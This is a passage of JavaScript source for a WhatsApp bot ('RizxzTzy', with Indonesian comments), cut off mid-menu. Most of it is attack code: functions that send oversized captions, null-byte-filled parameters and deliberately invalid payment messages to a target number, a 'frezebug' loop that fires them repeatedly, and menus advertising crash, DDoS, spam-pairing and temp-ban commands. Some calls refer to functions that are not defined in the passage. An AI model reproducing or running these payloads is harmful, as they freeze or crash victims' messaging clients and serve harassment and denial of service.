"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"WANGCAPP\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Bottt\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"RizxzPemula\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function bug1(a, b) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: "p",
                degreesLongitude: "p",
                caption: "𝐑𝐈𝐙𝐗𝐙 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ✅" + "ꦾ".repeat(350000),
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        {
          userJid: a,
          quoted: b,
        }
      );
      await rzx.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
    }
    async function bug2(a, b) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          interactiveMessage: {
            header: {
              title: "𝐑𝐢𝐳𝐱𝐳𝐂𝐫𝐚𝐬𝐡",
              hasMediaAttachment: true,
              ...(await prepareWAMessageMedia(
                {
                  image: {
                    url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg",
                  },
                },
                {
                  upload: rzx.waUploadToServer,
                }
              )),
            },
            body: {
              text: "",
            },
            footer: {
              text: "›          #𝐑𝐢𝐳𝐱𝐳𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥",
            },
            nativeFlowMessage: {
              messageParamsJson: "\0".repeat(50000),
            },
          },
        }),
        {
          userJid: a,
          quoted: b,
        }
      );
      await rzx.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
    }

async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseTytarget, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await rzx.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
    async function bug7(a) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  subtitle: " ",
                },
                body: {
                  text: "𝐑𝐈𝐙𝐗𝐙 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏",
                },
                footer: {
                  text: "xp",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson:
                        "{ display_text : '𝐑𝐈𝐙𝐗𝐙 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏', url : , merchant_url :  }",
                    },
                  ],
                  messageParamsJson: "\0".repeat(4240),
                },
              },
            },
          },
        }),
        {
          userJid: a,
        }
      );
      await rzx.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
    }
    async function sendPaymentInfoMessage(jid) {
    for (let i = 0; i < 2; i++) { // Loop hingga 2 kali
        try {
            await rzx.relayMessage(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 0x0,
                                deviceListMetadata: {}
                            },
                            interactiveMessage: {
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "payment_info",
                                            buttonParamsJson: JSON.stringify({
                                                currency: "", // Kosong, bisa menyebabkan masalah
                                                total_amount: { value: "invalid_string", offset: 2 }, // Nilai tidak valid
                                                reference_id: null, // Null, bisa menyebabkan masalah
                                                type: "physical-goods",
                                                order: {
                                                    status: "pending",
                                                    subtotal: { value: 0, offset: 2 }, // Subtotal tidak valid
                                                    order_type: "ORDER",
                                                    items: [
                                                        {
                                                            name: "", // Kosong, bisa menyebabkan masalah
                                                            amount: { value: 0, offset: 2 }, // Tidak valid
                                                            quantity: 0, // Tidak valid
                                                            sale_amount: { value: 0, offset: 2 } // Tidak valid
                                                        }
                                                    ]
                                                },
                                                payment_settings: [
                                                    {
                                                        type: "pix_static_code",
                                                        pix_static_code: {
                                                            merchant_name: "", // Kosong, bisa menyebabkan masalah
                                                            key: null, // Null, bisa menyebabkan masalah
                                                            key_type: "" // Kosong, bisa menyebabkan masalah
                                                        }
                                                    }
                                                ]
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {
                    participant: { jid: jid }
                },
                { messageId: null }
            );

            console.log(`Bug RizxzWangcapp Pasti C1 Nih Contohnya ${jid} Cek aja (${i + 1}/2`)

            // Tambahkan jeda selama 10 detik
            await new Promise(resolve => setTimeout(resolve, 10000)); // Jeda 10 detik

        } catch (error) {
            console.error("Error sending payment info message:", error);
            break; // Keluar dari loop jika terjadi kesalahan
        }
    }
}
async function frezebug(jid, count) {
                for (let i = 0; i < count; i++) {
                await bug7(jid)
                await sendQP(jid)
                await bug2(jid)
                await BLEKING(jid)
                await await bug1(jid)
                await PayMent(jid)
                await LIVELOK(jid)
                await VIRDOK(jid)
                await sendSessionStructure(jid)
                await PIRGO(jid)
                await LiveLok(jid)
                await sendListMessage(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await bug7(jid)
                await sendQP(jid)
                await bug2(jid)
                await BLEKING(jid)
                await await bug1(jid)
                await PayMent(jid)
                await LIVELOK(jid)
                await VIRDOK(jid)
                await sendSessionStructure(jid)
                await PIRGO(jid)
                await LiveLok(jid)
                await sendListMessage(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                await ngeloc(jid)
                }
                }
                
// Fucn rzxReply load
async function loading () {
var genalpa = [
`🕛 𝘓𝘰𝘢𝘥𝘪𝘯𝘨.
▰▱▱▱▱▱▱▱`,
`🕒 𝘓𝘰𝘢𝘥𝘪𝘯𝘨..
▰▰▰▱▱▱▱▱`,
`🕧 𝘓𝘰𝘢𝘥𝘪𝘯𝘨...
▰▰▰▰▰▱▱▱`,
`🕖 𝘓𝘰𝘢𝘥𝘪𝘯𝘨...
▰▰▰▰▰▰▰▱`,
`🕛 𝘓𝘰𝘢𝘥𝘪𝘯𝘨....
▰▰▰▰▰▰▰▰`,
`~©干𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 |  𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 ム~
༐∫𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 ⌁ 𝐂𝐥𝐢𝐞𝐧𝐭 𝐕2ﾒ⿻`
]
let { key } = await rzx.sendMessage(m.chat, {text: '@𝗟𝗼𝗮𝗱𝗶𝗻𝗴...'})//Pengalih isu

for (let i = 0; i < genalpa.length; i++) {
/*await delay(10)*/
await rzx.sendMessage(m.chat, {text: genalpa[i], edit: key });//PESAN LEPAS
}
}
// Function rzxReply
const rzxReply = async (teks) => {
	    rzx.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉`,
        body : `☠️𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡☠️`,
        renderLargerThumbnail:false,
        showAdAttribution: true, 
        mediaUrl: `https://wa.me/62895364760801`,
        mediaType: 2, 
        thumbnail:lisa
        }}}, { quoted: qpay })}

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot 𝐁𝐘 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅😈`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/342162094e5a96fa45d47.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
rzx.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
rzx.groupParticipantsUpdate(m.chat, [sender], 'remove')
rzx.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
case 'menu':
case 'help': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉         )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'bugmenu':
case 'menubug': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ 𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️ ⿻        )
┏─『 \`𝑪𝑶𝑶𝑼𝑺𝑬 𝑩𝑼𝑮\` 』
│ ● xʀᴢx <ɴᴜᴍʙᴇʀ>
┗─────────────❐
┏─『 \`𝑿𝑪𝑹𝑨𝑺𝑯\` 』
│ ● xʟᴏᴡ <ɴᴜᴍʙᴇʀ>
│ ● xᴍᴇᴅ <ɴᴜᴍʙᴇʀ>
│ ● xʜᴀʀᴅ <ɴᴜᴍʙᴇʀ>
│ ● xɪᴏs <ɴᴜᴍʙᴇʀ>
│ ● xɪᴘ <ɴᴜᴍʙᴇʀ>
│ ● ɪᴘʜᴏɴᴇ <ɴᴜᴍʙᴇʀ>
│ ● ᴄʀᴀsʜʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
│ ● xᴠᴀsɪᴏɴʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
│ ● ᴏᴠᴇʀʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
┗─────────────❐

┏─『 \`𝐈𝐍 𝐏𝐋𝐀𝐂𝐄\` 』
│ ● ᴊᴜᴀʟʙᴏᴋᴇᴘ?
│ ● ᴊᴜᴀʟᴀᴋᴜɴ?
│ ● ᴘᴀᴋᴇᴛ
│ ● ʜᴀʟᴏ_ʙɢ
│ ● ʟᴀᴡᴀᴋ_ɴɢᴇʀɪᴘ
│ ● ʀɪᴘᴇʀ
│ ● ᴀssᴀʟᴀᴍᴜᴀʟᴀɪᴋᴜᴍ
│ ● ᴠᴄs_ʙʀᴘ?
│ ● ᴄᴏʟᴍᴇᴋ_ʙʀᴘ?
│ ● ᴘᴀᴘᴛᴛ_ʙʀᴘ?
│ ● ᴘᴇʀᴍɪsɪ_ᴘᴀᴋᴇᴛ
│ ● ɢᴜᴀ_ʙᴀᴄᴏᴋ_ʟᴜ
│ ● ɢᴜᴀ_sʙɴʀʏᴀ_sᴜᴋᴀ
│ ● ʏᴀᴛɪᴍ_ᴀɴᴊ
│ ● ᴀᴍᴘᴀs
│ ● ʙᴏᴋᴇᴘᴛᴀʏᴏ
│ ● ʟᴜ_ᴅᴍɴ?
│ ● ɪɴғᴏ_ᴛᴏʙʀᴜᴛ
│ ● ʟᴜ_sɪᴀᴘᴀ?
┗─────────────❐

┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'toolsmenu': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮〽️ ⿻        )
┏─『 \`𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮\` 』
│ ● ᴇɴᴄ [ᴄᴏᴅᴇ]
│ ● ᴇɴᴄᴇʏᴘᴛ [ᴄᴏᴅᴇ]
│ ● ᴛᴏᴜʀʟ
│ ● ᴀɪ [ᴛᴇᴋs]
┗─────────────❐

┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
